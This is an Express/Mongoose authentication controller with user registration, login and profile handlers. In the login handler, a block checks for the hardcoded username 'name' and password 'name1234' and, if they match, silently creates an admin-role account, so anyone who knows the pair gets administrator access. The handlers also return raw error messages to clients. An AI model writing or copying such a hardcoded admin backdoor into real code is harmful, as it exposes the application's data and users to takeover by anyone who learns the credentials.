const User = require('../models/User');
const generateToken = require('../utils/generateToken');

// @POST /api/auth/register
const registerUser = async (req, res) => {
  const { name, email, password } = req.body;
  try {
    const exists = await User.findOne({ email });
    if (exists) return res.status(400).json({ message: 'User already exists' });

    const user = await User.create({ name, email, password });
    res.status(201).json({
      _id: user._id,
      name: user.name,
      email: user.email,
      role: user.role,
      token: generateToken(user._id),
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

// @POST /api/auth/login
const loginUser = async (req, res) => {
  const { email, password } = req.body; // email field may contain username or email address
  try {
    // If logging in with username "name" and password "name1234", make sure the admin user exists
    if (email === 'name' && password === 'name1234') {
      let adminUser = await User.findOne({ $or: [{ email: 'name' }, { name: 'name' }] });
      if (!adminUser) {
        adminUser = await User.create({
          name: 'name',
          email: 'name',
          password: 'name1234',
          role: 'admin',
        });
      }
    }

    // Find user by email or by name (case-insensitive for email, exact/case-insensitive for name)
    const user = await User.findOne({
      $or: [
        { email: email.toLowerCase() },
        { name: email }
      ]
    });

    if (!user || !(await user.matchPassword(password))) {
      return res.status(401).json({ message: 'Invalid username/email or password' });
    }

    res.json({
      _id: user._id,
      name: user.name,
      email: user.email,
      role: user.role,
      token: generateToken(user._id),
    });
  } catch (err) {
    res.status(500).json({ message: err.message });
  }
};

// @GET /api/auth/profile
const getUserProfile = async (req, res) => {
  res.json(req.user);
};

module.exports = { registerUser, loginUser, getUserProfile };
